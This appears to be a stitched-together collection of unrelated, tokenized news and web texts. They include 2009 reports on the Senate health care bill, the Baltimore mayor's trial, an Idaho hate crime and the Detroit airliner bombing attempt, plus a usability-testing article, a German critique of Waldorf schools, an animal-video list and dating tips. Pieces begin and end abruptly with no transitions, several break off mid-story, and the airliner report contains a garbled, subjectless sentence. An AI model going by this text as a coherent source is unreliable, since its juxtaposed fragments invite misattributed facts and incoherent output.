WASHINGTON — Sen. Olympia Snowe ( R - ME ) said on Sunday she will join Republicans in filibustering the Senate health care bill , claiming the process has been moving too fast .
“ I deeply regret that I cannot support the pending Senate legislation as it currently stands , ” Snowe said in a statement , announcing that she wo n’t allow it to proceed to a final vote .

She cited “ continued concerns with the measure and an artificial and arbitrary deadline of completing the bill before Christmas that is shortchanging the process on this monumental and trans - generational effort . ”
Snowe ’s affirmation comes one day after Senate Democrats announced their unified support , along with the two independent senators , for the bill .
As things stand , every Republican is projected to filibuster it .
“ Only three weeks ago the Senate received a more than 2,000 page bill on one of the most complex issues in our history , ” Snowe said .
“ It defies logic that we are now expected to vote on the overall , final package before Christmas with no opportunity to amend it . ”
Snowe echoed these claims on Sunday in an appearance on CBS .
“ This process denies us the opportunity to thoroughly and carefully and deliberately evaluate what ’s at stake , ” she said .
The Senator from Maine told the New York Times that “ it is a take - it - or - leave - it package . ”
She said she still remains interested in pursuing health reform , just not the current version on the table .
ADVERTISEMENT
Snowe ’s declaration leaves no room for the Democratic leadership to upset any senators , as each of the 60 outside the GOP are now critical to the success of the legislation .
“ I remain convinced we must work toward a responsible , common sense solution to reverse the trend of spiraling health care costs , ” she said , “ that will cause one - in - four Americans this year to have either inadequate coverage or none at all , and threatens affordable coverage for millions more Americans in the future . ”
The GOP leadership has on numerous instances said the process is moving too fast .
Democrats have shot back and said this health care debate has been going on for over a year .

Snowe ’s vote has been heavily courted by the White House and Democratic leadership in an effort to achieve a bipartisan bill .
They succeeded in winning her vote for the Senate Finance Committee bill , which also excluded the public option .
Snowe ’s demands have largely centered on removing the provision .
There seems to be this idea going around that usability testing is bad , or that the cool kids do n’t do it .
That it ’s old skool .
That designers do n’t need to do it .
What if I told you that usability testing is the hottest thing in experience design research ?
Every time a person has a great experience with a website , a web app , a gadget , or a service , it ’s because a design team made excellent decisions about both design and implementation — decisions based on data about how people use designs .
And how can you get that data ?
Usability testing .
Article Continues Below
Jared Spool will tell you for free that when his company researched the causes of failed designs , they found that lack of information was the root of all bad design decisions .
The point of user research is to make good , solid , confident decisions about design .
Why usability testing as opposed to using other methods ?
I contend that 80 % of the value of testing comes from the magic of observing and listening as people use a design .
The things you see and the things you hear are often surprising , illuminating , and unpredictable .
This unpredictability is tough to capture in any other way .
The other 20 % of the value comes from the pre-testing discussions team members have as they decide what their Big Questions are and the post - testing discussions about what to do with what they ’ve learned .
One test does n’t fit all #section2
When I say “ usability test , ” you may imagine something that looks like a psych experiment :
The “ Subject ” is in one room , with a stack of task cards and may even have biometric sensors attached .
The “ Researcher ” is in another room , madly logging data and giving instruction over an intercom as the voice of god .
That image of a usability test is what I ’d call “ formal usability testing , ” and is probably going to be summative and validating .
It ’s a way to verify whether the design does what you want it to do and works the way you want it to work .
This is often the kind of test done toward the end of a design cycle .
What I ’m interested in — and I think most of you are interested in — is how to explore and evaluate in the early and middle stages of a design .
The classic process#section3
The process that Jeff Rubin and I present in the Handbook of Usability Testing , Second Edition could be used for a formal usability test , but it could also be used for less formal tests that can help you explore ideas and form concepts and designs .
The steps are basically the same for either kind of test :
Develop a test plan
Choose a testing environment
Find and select participants
Prepare test materials
Conduct the sessions
Debrief with participants and observers
Analyze data and observations
Create findings and recommendations
Let ’s walk through each of these steps .
Develop a test plan#section4
Sit down with the team and agree on a test objective ( something besides “ determine whether users can use it ” ) , the questions you ’ll use , and characteristics of the people who will be trying out the design .
( We call them participants , not subjects . )
The plan also usually includes the methods and measures you ’ll use to learn the answers to your research questions .
It ’s entirely possible to complete this discussion in under an hour .
Write everything down and pick someone from the team to moderate the test sessions .
Choose a testing environment #section5
Will you use a lab ?
If not , what ’s the setup ?
Will you record the sessions ?
Again , the team should decide these things together .
It ’s good to include these logistics in the test plan .
Find and select participants #section6
Focusing on the behavior you ’re interested in observing is easier than trying to select for market segmentation or demographics .
If you ’re testing a web conferencing service , you want people who hold remote meetings .
If you ’re testing a hotel reservation process on a web site , you want people who do their own bookings .
If you want to test a kiosk for checking people into and out of education programs , you want people who are attending those programs .
Make sense ?
Do n’t make recruiting harder than it has to be .
Prepare test materials #section7
You ’re going to want some kind of guide or checklist to make sure that the moderator addresses all of the research questions .
This does n’t mean asking the research questions of the participants ; it means translating the research questions into task scenarios that represent realistic user goals .
In the test materials , include any specific interview questions you might want to ask , prompts for follow - up questions , as well as closing , debriefing questions that you want to ask each participant .
Conduct the sessions #section8
The moderator is the master of ceremonies during each session .
This person sees to the safety and comfort of the participants , manages the team members observing , and handles the data collected .
Though only one person from the team moderates , as many people from the team as possible should observe usability test sessions .
If you ’re going to do multiple individual sessions , each team member should watch at least two sessions .
Debrief with participants and observers #section9
At the end of each session , be sure to take a step back with the participant and ask , “ How ’d that go ? ”
Also , invite the trained observers to pass follow - up questions to the moderator or to ask questions themselves .
Thank the participant , compensate him or her , and say good - bye .
Now , the team observing should talk briefly about what they saw and what they heard .
( This discussion is not about solving design problems , yet . )
Analyze data and write up findings # section10
What you know at the end of a usability test is what you observed :
What your team saw and heard .
When you look at those observations together , the weight of evidence helps you examine why particular things happened .
From that examination , you can can develop theories about the causes of frustrations and problems .
After you generate these theories , team members can use their expertise to determine how to fix design problems .
Then , you can implement changes and test your theories in another usability test .
What you get #section11
If you follow this process in a linear way , you ’ll end up with thorough planning , solid controls , heaps of data , rigorous analysis , and — finally — results .
( As well as a lot of documentation . )
It can feel like a big deal , and sometimes it should be .
But most real - world usability tests need to be lighter and faster .
Some of the best user experience teams do only a few hours of testing every month or so , and they may not even think of it as “ usability testing . ”
They ’re “ getting input ” or “ gathering feedback . ”
Whatever .
As long as it involves observing real people using your design , it ’s usability testing .
Really , all you need for a usability test is someone who is a user of your design ( or who acts like a user ) , something to test ( a design in any state of completion ) , and someplace where the user and the design can meet and you can observe .
Someplace can even be remote , depending on the state of the design .
You can do all that fancy lab stuff , but you do n’t have to .
Once you get into a rhythm of doing user research and usability testing , you ’ll learn shortcuts and boil the process down to a few steps that work for you .
When we get down to the essential steps in the usability testing process , this is what it tends to look like :
Develop a test plan#section13
In the classic process , a usability test plan can be several pages long .
Teams in the swing of doing testing all the time can work with a minimalist structure with one or two lines on the elements of the plan .
Find participants #section14
Again , this is about behavior .
The behavior you ’re interested in for the study is parents going through the process of getting their kids into college .
Just make sure you :
Know your users
Allow enough time
Learn and be flexible
Remember they ’re human
Compensate lavishly
Conduct the sessions # section15
If you ’re the moderator , do your best to be impartial and unbiased .
Just be present and see what happens .
Even the designer can be the moderator so you can step back and see the test as an objective exercise .
Remember that this is not about teaching the participant how to use the interface .
Give a task that realistically represents a user goal and let the rest happen .
Just listen and watch .
( Of coure , if the task is something people are doing in real life and they ’re having trouble in the session , show them the correct way to do the task with the current design after you ’ve collected your data . )
As the session goes on , ask open - ended questions : Why ?
How ?
What ?
Debrief with observers and come to consensus about design direction # section16
Talk .
Brainstorm .
Agree .
Unless the design was perfect going into the usability test ( and that ’s a rare thing ) and even if the team has only done one or two sessions , use the observations you made to come up with theories about why things happened for participants the way they did .
Make some changes and start the cycle again .
Where do great experience designs come from ?
Observing users#section17
Getting input from users is great ; knowing their requirements is important .
Feedback from call centers and people doing support is also helpful in creating and improving designs .
Whatever your team might call it — usability testing , design testing , getting feedback — the most effective input for informed design decisions is data about the behavior and performance of people using a design to reach their own goals .
Teams that have lots of data make better design decisions .
Nine times out of ten , that data comes from some kind of usability testing .

BALTIMORE , Nov. 10 ( UPI ) -- Baltimore Mayor Sheila Dixon pleaded not guilty to theft charges , courtroom observers said .
Appearing Monday on the first day of her trial in Baltimore 's Courthouse East , Dixon 's lawyers entered a " not guilty " plea to charges she misappropriated city - issued retail gift certificates meant for the needy , allegedly using them to purchase items for friends and family , The Baltimore Sun reported .

The newspaper said much of the trial 's first day was taken up by jury selection , during which Dixon frequently conferred with defense lawyers and prosecutors at the bench and interviewed potential jurors .
The Sun reported that Dixon spoke only briefly , saying " Yes , Your Honor " when Judge Dennis Sweeney asked her to acknowledge that she had the right to accompany her lawyers during bench conferences .
Observers said Dixon appeared businesslike during the proceedings and did not appear to use her BlackBerry as she does routinely during City Hall meetings .
The Sun said the mayor occasionally wrote in a notebook or whispered to lead defense attorney Arnold Weiner .

Sie haben vorhin gefragt , ob denn auch Plastik benutzt wird .
Natürlich kann mal jemand aus der Reihe tanzen , aber das ist nicht vorgesehen .
Was hier vorgeführt wurde , z.B. die Herstellung eines Holzkochlöffels im Werkunterricht , ist ganz fest von Steiner vorgegeben . “
Einundzwanzig … weiter komme ich nicht , der Blitz ist ganz in der Nähe : „ Jeder der hier ist , weiss doch , dass dies eine anthroposophische Schule ist , das kann man doch ganz schnell im Internet nachschauen ! “
Ich denke : „ Was du wohl im Internet gefunden hast … ist doch alles fest in Anthroposophen - Hand , z.B. wikipedia , eine einzige anthroposophische Manipulation “ und sage :
„ Ja , aber was bedeutet » Anthroposophie « ?
Das wird doch überhaupt nicht deutlich .
Ist erklärt worden , welche Bedeutung Steiners » Jahrsiebtelehre « für den Unterricht hat ? “
„ Das hier ist ja nicht die erste Informationsveranstaltung , wenn Sie auf der anderen gewesen wären , dann wüssten Sie , worum es geht . “
„ Ich W A R beim ersten Info - Abend der Johannes - Schule . “
Soll mal reichen , ich sage nicht „ Was Gunhild A. hier letztes Mal » für das Kollegium « gebracht hat , war die reine Volksverdummung . “
„ Wenn es Ihnen nicht gefällt , dann können Sie ja gehen , was wollen Sie hier überhaupt ? “
„ Ich will wissen , wie über die Waldorfschule informiert wird , will einen Artikel darüber schreiben . “
„ Ach , dann sind Sie gar kein Vater ?!!! “
Der Rest geht im Sturm unter .
Ein Waldorfschüler neben mir stellt mir eine Frage .
Ich mache „ Pssst ! “ , man will ja nicht unhöflich sein .
Und auch nicht riskieren , dass die Waldorf - Anhänger vielleicht doch noch zur Lynch - Justiz greifen .
Und gehe .
Ich warte vor der Schule .
Der Tabubrecher – „ Plastik “ – spricht mich an .
Der Herr hatte sogar eine noch weit heiklere Frage gestellt : „ Welche Rolle spielen denn die modernen Medien in der Waldorfschule ? “
War er nur naiv ?
„ Medien “ – das Fernsehen – sind verboten , sind sie doch des Ahrimans – „ Ahriman “ : Teufel auf anthroposphisch – , das weiß man doch , wenn man an die Waldorfschule glaubt .
„ Die Reaktion war sehr aussagekräftig … “
„ Ja “ , stimme ich zu .
„ Sie waren der Einzige , der gute Fragen gestellt hat .
Schon unheimlich , wie gross die Zustimmung war … “
Dann versuche ich , auf die Schnelle die größten Lügen anzusprechen :
„ Wenn es immer wieder hieß , » Wie neueste Ergebnisse der Hirnforschung bestätigen « , dann ist das totaler Quatsch .
Rudolf Steiners esoterische » Menschenkunde « , auf der die ganze Waldorfpädagogik basiert , hat nichts , aber auch rein gar nichts , mit moderner Erziehungswissenschaft geschweige denn mit Hirnforschung zu tun … “
Ich glaube , dieser
Herr – wenn er denn ein Vater war – meldet sein Kind nicht an der Johannes - Schule an .
Aber vielleicht möchte jemand anders sein Glück versuchen ?

Zum Autor : Andreas Lichte ist ausgebildeter Waldorflehrer und Grafiker , lebt in Berlin .
Er ist Autor kritischer Artikel zur Waldorfpädagogik und Anthroposophie .
Er erstellte für die „ Bundesprüfstelle für jugendgefährdende Medien “ ( BPjM ) ein Gutachten zur Indizierung zweier Werke Rudolf Steiners , die fortan nur noch in kommentierter Form erscheinen dürfen .
Glossar
Glossar
( in der Reihenfolge des Auftauchens der Begriffe ) :
Mozart : Inbegriff des Wunderkindes : Schon im „ Kindergarten - Alter “ komponiert Mozart und gibt Konzerte .
Hätte er einen Waldorfkindergarten besucht , hätte er nur diese Musik kennengelernt :
Pentatonik : Als Pentatonik ( gr. π εντα - penta- „ Fünf - “ ) oder Fünftonmusik bezeichnet man in der Musik Tonleitern , die aus fünf verschiedenen Tönen bestehen und meist keine Halbton - Schritte enthalten , sowie die dazugehörigen Tonsysteme .
Auch für die Pentatonik gilt , was der Erziehungswissenschaftler Prof.
Klaus Prange ganz allgemein zur Waldorfpädagogik sagt , „ Erziehung zur Anthroposophie “ , Seite 86 : „ In der Tat entsteht aus der Differenz von allgemeiner , öffentlicher Präsentation , die sich der üblichen Vokabeln und Formeln bedient , und dem , was eigentlich damit gemeint ist , der Eindruck , man habe es bei der anthroposophischen Pädagogik mit einer Art Mogelpackung zu tun , die ein sehr eigenwilliges Produkt in einer geläufigen und höchst normalen Verpackung an den Mann zu bringen versucht . “
Was mit der „ eigenwilligen “ Pentatonik in der Waldorfpädagogik gemeint ist , ist die Frage : „ Wollt ihr die totale Harmonie ? “
Oder anders gefragt : „ Wollt ihr euer Leben in einem Schlaf - ähnlichen Zustand zubringen ? “
Nur werden die Kinder das nicht gefragt .
Weil , wie die Musiklehrerin und Eurythmistin auf dem Informationsabend der Johannes - Schule ausführte , es „ menschenkundlich “ ( d.h. laut Steiner ) so ist , „ dass sich Kinder erst ab dem 9ten Lebensjahr öffnen , das Herz vorher noch eine Blüte ist “ , sprich : den Kindern vorher wesentliche seelische und emotionale Fähigkeiten fehlen , womit wir hier wären :
„ Jahrsiebtelehre “ : Rudolf Steiners esoterische Einteilung der Individualentwicklung des Menschen in Abschnitte von 7 Jahren .
Neben der „ Temperamentenlehre “ der für die Praxis der Waldorfpädagogik folgenreichste Aspekt der esoterischen „ Menschenkunde “ Rudolf Steiners .
In der Waldorfpädagogik ist eine viergliedrige Unterteilung in „ Jahrsiebte “ üblich :
– von 0 –7 Jahre wird der physische Leib entwickelt
– von 8 – 14 Jahre der Ätherleib
– von 15 – 21 Jahre der Astralleib
– vom 21 Lebensjahr an wird das „ Ich “ ausgebildet , erst dann ist der Mensch ein Mensch , vollwertig .
Das Ergebnis ist ein „ Mensch “ , der nach dem Baukastenprinzip zusammengesetzt ist .
So hölzern und unpädagogisch Steiners Entwicklunglehre daherkommt , so wenig zutreffend ist dafür das beliebte Schlagwort „ ganzheitlich “ .
Für die Unterrichtspraxis bedeutet die Jahrsiebtelehre , dass der Waldorflehrer nur die Fähigkeiten ansprechen darf , die der Schüler laut Steiner seinem Alter entsprechend auch schon besitzt .
Beispiel : Ein Schüler der 1sten bis 8ten Klasse , – der Klassenlehrerzeit , sie ist identisch mit dem 2ten Jahrsiebt – , verfügt noch nicht über einen voll ausgebildeten „ Astralleib “ oder gar ein „ Ich “ .
Was soll der Lehrer mit einem so unvollständigen Schüler anfangen ?
Richtig , er gibt „ Frontalunterricht “ .
Und zwar in seiner extremsten Form : Der Schüler soll nachahmen , nachahmen , nachahmen …
Hören wir zu den Jahrsiebten noch den Anthroposophen Prof. Dr. Wolfgang Schad , der im „ Seminar für Waldorfpädagogik Berlin “ als eine „ Kapazität der Waldorfpädagogik “ vorgestellt wurde .
In „ Der Umschwung in der Reifezeit – Lebensprozesse und Seelengeburt “ erklärt Schad , Zitat :
„ Es sei eine unendliche Hilfe für die ganze Biographie , wenn dem Kinde und dem Jugendlichen dieser Sieben - Jahre - Rhythmus durch die Pädagogik vermittelt werde .
–
Er ist also nicht fertig mitgegeben und so diagnostisches Resultat , sondern er ist THERAPEUTISCHE AUFGABE [ sic ! hervorgehoben auch im Original ] .
Durch die Abweichungen vom Sieben - Jahre - Rhythmus zeigt das Kind seine karmische Individualisierung .
Aber wenn durch Mithilfe der erziehenden Erwachsenen der Anschluß an diesen Sieben - Jahre - Rhythmus wiedergefunden wird , dann kann das individuelle Schicksal wieder mit dem in Beziehung treten , was alle Menschen miteinander verbindet : mit dem Menschheitlichen .
Das ist tief karmisch wirkendes Therapeutisches .
Diesen Sieben - Jahre - Rhythmus gäbe es nur dann für jeden Menschen in der menschlichen Ordnung , wenn die Widersachermächte Luzifer und Ahriman in die Menschheitsevolution nicht eingegriffen hätten .
Führen wir die uns Anvertrauten zum Sieben - Jahre - Rhythmus zurück , so helfen wir ihnen bei der Bewältigung der Gegenmächte gegen alles Menschliche . “
Mit anderen Worten : dem Wolferl ( Mozart ) hätte die Waldorfpädagogik schon noch die Flauseln ausgetrieben .
„ Holzkochlöffel “ : Alles in der Waldorfschule wird von Rudolf Steiner vorgegeben , so auch die Aufgabe „ Holzkochlöffel “ für den Werkunterricht der 6ten Klasse .
Ausgehend von einem rohen Holzklotz wird der Kochlöffel geschnitzt .
Daran soll insbesondere das Scheitern gelernt werden : Diese Aufgabenstellung verzeiht keine Fehler .
Ich möchte hier nicht auf den „ menschenkundlichen “
Hintergrund eingehen ( Glück gehabt , Liebe Leser ! ) , sondern mich an der Praxis orientieren .
Frage : Welcher Sechstklässler kann trotz eines Verbotes der modernen Medien in der Waldorfschule noch nicht bei google „ Holzkochlöffel “ eingeben ?
Richtig , die meisten werden es wohl können .
Und was finden sie da ?
„ Holzkochlöffel , 34 Cent “ .
Könnte es sein , dass sich da der ein oder andere fragt , was er 4 Wochen lang getan hat ?
„ Aber das ist doch ein Unikat , das ist doch ganz was anderes ! “
Siehe den Friedhof der Kuscheltiere , Pardon , Friedhof der Schaukelpferde , in der Rudolf Steiner Schule Berlin Dahlem : Der Werklehrer , Herr B. , zeigte mir seinen Keller : Dutzende von den Schülern aufgegebene Schaukelpferde … alles Unikate , mühsam von den Schülern gebaut .

Idaho Vandals leave racist message Fri. , Dec. 4 , 2009 Coeur d’Alene resident Haitham Joudeh woke to a call from the Coeur d’Alene Police Department on Friday morning telling him of racist graffiti painted on his truck sometime after midnight at the corner of Third Street and Coeur d’Alene Avenue .
( Kathy Plonka )
Discuss story Huckleberries Online :
There have been 7 hate crimes in the Inland Northwest since May .
What has triggered this recent epidemic of hate crimes locally ?
A Coeur d’Alene man of Middle Eastern descent left his pickup parked downtown Thursday night and returned to find it spray - painted with swastikas and a racial slur and a front tire slashed .
The Kootenai County Task Force on Human Relations counts the incident as the seventh hate crime perpetrated in the Inland Northwest since May , co-founder Tony Stewart said Friday .
Haitham Joudeh , 33 , who is a Muslim of Jordanian descent , was celebrating a friend ’s birthday Thursday and left his black Ford F350 truck parked at the corner of Third Street and Coeur d’Alene Avenue .
Friends drove Joudeh and his wife home around midnight , he said .
In the morning , he was notified by police that his truck had been vandalized .
Two swastikas were painted on it along with a slur urging him to “ go home . ”
“ I was born in this state .
This is my home .
What are they talking about ? ” said Joudeh , a University of Idaho graduate .
“ It makes me feel like I do n’t belong in this place .
It makes me fear for my life and my family ’s life .
I mean , what ’s next ?
They ’re going to come to my house ?
Seriously , what ’s going to be next ? ”
Someone already has been to his house , where Joudeh lives with his wife and baby son .
On Friday morning , Joudeh found a racist flier from the Aryan Nations in a plastic baggie on his lawn .
The flier was similar to those distributed in several other Inland Northwest neighborhoods in recent months .
Stewart said the vandalism of Joudeh ’s vehicle qualifies as a hate crime .
It is the most recent in a spate of hate crimes , he said .
In other incidents , a noose was left on a Spokane doorstep ; a swastika sticker was affixed to the door of a Coeur d’Alene human rights center ; and Hispanic , African - American and Native American people were targeted in several harassment and assault cases .
“ There is an escalation , ” Stewart said .
“ We do n’t know who ’s doing it .
My suspicion is , from some of the profiles … it seems to be more than one group involved . ”
Stewart said the task force will do everything within its power to help Joudeh ’s family .
“ In all these cases , ” Stewart said , “ if you can find the people , you prosecute them for a felony and you send them to prison .
This community wo n’t turn a blind eye . ”
Coeur d’Alene police said they are investigating the incident as a hate crime .
Idaho ’s malicious harassment law makes it a felony to deface personal property with “ any word or symbol commonly associated with racial , religious or ethnic terrorism . ”
Joudeh , a developer , said he has faced harassment since he filed a multimillion - dollar lawsuit against Kootenai County , alleging improper denial of a project he had proposed at Mica Bay .
Joudeh ’s company , Jordan International , proposed a condominium storage unit facility on 10 acres just off U.S. Highway 95 .
The case is pending in 1st District Court .
Joudeh said his ethnicity was raised , in a negative light , by people opposed to the project during the first hearing .
“ Nothing was done or said about it , ” Joudeh said .
Since he filed his lawsuit , he said , he has been the subject of racist e-mails and Internet blog posts regarding his proposed project .
A tort claim filed against the county as a precursor to the lawsuit alleged that the project was denied partly because of racism .
Kootenai County commissioners deny that race was any factor .
Board Chairman Rick Currie said that accusation is an “ embarrassment to the residents of our county . ”
Commissioner Todd Tondee said decisions are not made based on race ; they ’re made based on the project .
Currie also expressed anger toward whomever targeted Joudeh in the vandalism incident .
“ That is absolutely unacceptable , ” he said .
“ There is no place in this country for that type of action .
It is something we cannot tolerate . ”

WASHINGTON , Dec. 27 , 2009  --
The 23 - year - old Nigerian man charged with attempting to blow up a Detroit - bound airliner on Christmas was transferred today from the University of Michigan Medical center , where he was treated for burns , to a federal prison in Milan , Mich. , 50 miles from Detroit .
Umar Farouk Abdulmutallab was on Northwest Airlines flight 253 from Amsterdam to Detroit , when passengers heard a loud pop and noticed smoke and flames coming from his legs .
A Dutch film director immediately approached the suspect , put out the flames , and subdued him with help from other passengers and crewmembers .
Abdulmutallab was charged Saturday with attempting to destroy or wreck an aircraft , and placing a destructive device in a plane .
Abdulmutallab faces a federal court hearing Monday at 2 p.m. , during which prosecutors will seek to obtain DNA samples , per federal rules .
will not be appearing at his court hearing tomorrow .
Abdulmutallab is not expected to be at the hearing .
While Obama administration officials tried to reassure the country that the response to the incident proved that the airline security measures put in place after the terror attacks of Sept. 11 , 2001 , are working , a second incident -- on the same flight number as the Christmas Day attempted bombing -- sparked new fears .
At around 12:30 p.m. ET , Northwest Airlines alerted the Transportation Security Administration of a suspicious male who spent a considerable amount of time in the airplane lavatory .
Federal law personnel responded immediately .
As with the Christmas day incident , President Obama was briefed on the emergency while vacationing in Hawaii .
It turned out to be a false alarm – a man with food poisoning , but it underscored the real threat faced just two days ago .
Today the White House ordered a review to answer two critical questions about gaps airline security .
First , how Abdulmutallab – a man on a terrorist watch - list whose father had warned U.S. authorities of his radicalism – managed to board a plane bound for the United States , and second , how he managed to get past airport security with explosives , onto two separate flights from Nigeria to Amsterdam , then from Amsterdam to Michigan .
Napolitano explained that after Abdulmutallab's father , a wealthy Nigerian banker , had reported his son's growing radicalism to a U.S. embassy in Lagos , Nigeria , Abdulmutallab was placed on a Terrorist Identities Datamart Environment ( TIDE ) list , but not placed on a " no- fly " or a " selectee " list , which would have prevented him from boarding a plane .
" There were simply , throughout the law enforcement community , never information that would put this individual on a no - fly list or a selectee list .
So that 's number one , " Homeland Security Chief Janet Napolitano said on ABC 's " This Week .
" Number two , I think the important thing to recognize here is that once this incident occurred , everything happened that should have , " she said .
" The passengers reacted correctly , the crew reacted correctly , within an hour to 90 minutes , all 128 flights in the air had been notified .
And those flights already had taken mitigation measures on the off - chance that there was somebody else also flying with some sort of destructive intent . "
Napolitano also tried to reassure the public .
" The system has worked really very , very smoothly over the course of the past several days , " said on ABC 's " This Week . "
Napolitano said the U.S. was working with authorities in Amsterdam to make sure screening there was done properly .
But critics say the system , in fact , may not be working .
" This is , in my view , is probably one of the worst situations I 've ever heard of .
And to cast this as the system working is not really what the American public needs to hear , " former FBI agent Jack Cloonan said in an interview with ABC News .
And Republicans accused the White House of complacency amid a steady stream of attacks , including the deadly shooting at Fort Hood .
" The threat to the United States , is real .
I think this administration has downplayed it .
They need to recognize it , identify it , " said Rep. Pete Hoekstra , R - Mich. , on " Fox News Sunday . "
Gibbs rejected that the administration is not doing all that it can to fight terrorism .
" The president is very confident that this government is taking the steps that are necessary to take – to take our fight to those that seek to do us harm , " he said .
Federal law enforcement sources tell ABC
News that the incident is a sobering reminder that the war against terrorism is a deadly game of chess , with terrorists becoming more creative all the time .

The 10 best animal videos of 2009
Yesterday , we rounded up the best viral videos of 2009 , non-animal edition .
Today , it ’s time to embrace the cute , cuddly , strange , and wonderful world of animals online .
10 . Kingsford the piglet
A tiny piglet who goes to the beach ?
Yes , please !
9. “ Surprise Kitty ”
Of course .
8. Puppies dressed as cats
Conan O’Brien hit it out of the park with this insta-classic pile of cute - upon - cute .
7. “ Birds on the Wires ”
Not all animal videos have to be adorable or hilarious .
Most do , but there ’s room for a more artistic entry on this list , hence this image - to - music video :
6 . Dog on a slide
At first I laughed , and then I thought “ hmm , I bet that does feel great . ”
There are not enough of those roller slides out there anymore .
5 . “ So Your Cat Wants A Massage ? ”
Somewhere between charming animal videos and accidental Dadaist performance art lies this very video .
4. The NY Lotto Sweet Millions commercial , particularly the piglets in PJs
I was loathe to include a commercial on this list , but this ranks among the great moments in baby animal cuteness .
I ’ve seen this ad dozens of time , and it still just slays me .
3 . “ Slow loris loves getting tickled ”
And we love watching it .
2. Keyboard Cat
Easily the meme of year , and 20 times better than just writing “ fail , ” Keyboard Cat had as big a year as Taylor Swift .
1 . The French Bulldog puppy who ca n’t roll over
I called this the cutest video ever , and I stand by that .
This is far and away the best animal video of the year , and it ’s one for the all - time record books .
Polling data released today by the Pew Research Center showed the start of what may well be an historic shift in the American public ’s foreign policy priorities away from a multi- decade bias toward globalist interventionism and toward what the center called “ isolationist sentiment . ”
But far from isolationist , the policy supported appeared to be a less bellicose , decidedly non-interventionist foreign policy , but one which still recognized the value of foreign trade ( more supportive of free trade now than in previous polls , in fact ) .
The real eye - popping statistic , however , was that for the first time in the poll ’s 40 year history , most Americans supported a policy of “ minding its own business internationally . ”
Fascinatingly enough the study asked the same questions of members of the Council on Foreign Relations , and showed that the group of influential policy - makers still sees the world with largely the same mindset it had been in the past , seeing America needing to take a “ leadership ” role in the world and putting top priority on more interventionist policies .
The transition is far from complete .
Most Americans , for instance , still support military action against Iran in principle and many still have a troubling attachment to the value of torture .
But if the trend continues , the more interesting question will be if the CFR members start to catch up with popular sentiment on foreign policy or if the split between popular opinion and government policy will continue to grow .

To spot a gold digger , watch out for someone who asks about what you own , like what you earn or your stock options , early on in your relationship .
Additionally , see how they respond when you ask them about their career .
For example if they ’re happy to stay in a low - level job or not have one at all , they may be looking for someone to fund their lifestyle .
If you want to test out your partner , give them an inexpensive but thoughtful gift , like a flower , since they may be a gold digger if they dismiss it .
Alternatively , ask them what their idea of romance is , since you may be able to tell they ’re a gold digger if they only talk about money or material gifts .
Be cautious if your partner often has sudden emergencies that cause them to need money from you , which is a typical excuse used by gold diggers .
For tips from our Relationship co-author on how to spot a gold digger from their dating profile , keep reading !
As soon as swine flu vaccinations start next month , some people getting them will drop dead of heart attacks or strokes , some children will have seizures and some pregnant women will miscarry .
But those events will not necessarily have anything to do with the vaccine .
That poses a public relations challenge for federal officials , who remember how sensational reports of deaths and illnesses derailed the large - scale flu vaccine drive of 1976 .
This time they are making plans to respond rapidly to such events and to try to reassure a nervous public  and headline - hunting journalists  that the vaccine is not responsible .
Every year , there are 1.1 million heart attacks in the United States , 795,000 strokes and 876,000 miscarriages , and 200,000 Americans have their first seizure .
Inevitably , officials say , some of these will happen within hours or days of a flu shot .
• A daily summary of global reports on security issues .
Filipino militants released an elderly Irish priest late on Wednesday night after holding him in captivity for 32 days .
Father Michael Sinnott had worked in the Philippines for nearly 33 years when six armed gunmen kidnapped him from a gated compound in Pagadian City on Oct. 11 .
He was released into the custody of the Moro Islamic Liberation Front ( MILF ) , which turned him over to government authorities on Thursday morning .
Although militants released a video in November in which Fr. Sinnott said his captors would release him in exchange for $ 2 million , the Irish Department of Foreign Affairs says that he was released without any ransom payments .
Michael Martin , Ireland 's foreign affairs minister told reporters that refusing to pay any ransom was in line with his country 's policy to discourage future kidnappings , reports the Guardian .
Paying kidnappers would set a precedent that endangers Irish citizens and " jeopardised the vital work of aid workers and missionaries around the world , " he said .
According to a high - ranking member of MILF , the rebel group acted as an intermediary between the kidnappers and the government as a goodwill gesture to show their commitment to peace , reports The Philippine Star .
Ghadzali Jaafar , MILF 's vice chairman of political affairs , added that his organization would help bring the kidnappers to justice and " expressed disappointment " in response to claims that the abduction had been carried out by a rogue , MILF splinter group .
Filipino police and military authorities later identified Sinnott 's captors as part of a pirate band that eventually turned the priest over to a rogue element of MILF , reports Tempo , a Filipino newspaper .
Despite the potential involvement of a MILF - linked organization , the Filipino government praised the Muslim separatist group for its assistance and cooperation throughout the kidnapping .
Major General Ben Dolorfino , a Filipino official , called the group 's actions a " big confidence - building measure in forthcoming peace talks , " reports the Daily Telegraph .
Sinnott has a serious heart condition and there were many concerns about his health while in captivity .
However , after a clinical assessment doctors said he is " as well as can be expected in the circumstances , " reports the Irish Times .
Speaking to reporters at the Manila airport on Thursday morning , the priest also appeared in good humor .
Johnny R. Williams , 30 , would appear to be an unlikely person to have to fret about the impact of race on his job search , with companies like JPMorgan Chase and an M.B.A. from the University of Chicago on his résumé .
But after graduating from business school last year and not having much success garnering interviews , he decided to retool his résumé , scrubbing it of any details that might tip off his skin color .
His membership , for instance , in the African - American business students association ?
Deleted .
“ If they ’re going to X me , ” Mr. Williams said , “ I ’d like to at least get in the door first . ”
Similarly , Barry Jabbar Sykes , 37 , who has a degree in mathematics from Morehouse College , a historically black college in Atlanta , now uses Barry J. Sykes in his continuing search for an information technology position , even though he has gone by Jabbar his whole life .
“ Barry sounds like I could be from Ireland , ” he said .
That race remains a serious obstacle in the job market for African - Americans , even those with degrees from respected colleges , may seem to some people a jarring contrast to decades of progress by blacks , culminating in President Obama ’s election .
A Melbourne computer company says Apple is " trying to burn us out " with legal fees in the latest David and Goliath battle over the iPod maker 's trademarks .
Peter McRae , managing director of Macpro Computers in Collingwood , has provided " Macpro " - branded computers and technical support to businesses for 26 years but has been jumping through legal hoops ever since Apple was preparing to launch its Mac Pro line of computers about 3 and a half years ago .
Macpro Computers managing director Peter McRae .
In an oversight he now seriously regrets , McRae did not officially register the Macpro trademark .
" Apple came along with the Mac Pro and before it was launched they heard about us because we applied to be an [ Apple ] reseller .
As soon as they saw " Macpro " pop up as an applicant , it alerted them to the fact that there was a Macpro here , " McRae said in a phone interview .
Shortly after the Kennedy assassination , a most unlikely celebrity bested the Beatles on the charts .
She was Sister Luc Gabriel ( Jeanine Deckers ) , better known as " The Singing Nun . "
Deckers had joined a Belgian convent in 1959 .
The songs she wrote and performed ( particularly “ Dominique , ” a salute to the founder of her religious order ) proved so popular that her superiors persuaded her to sell recordings to visitors to raise money for convent .
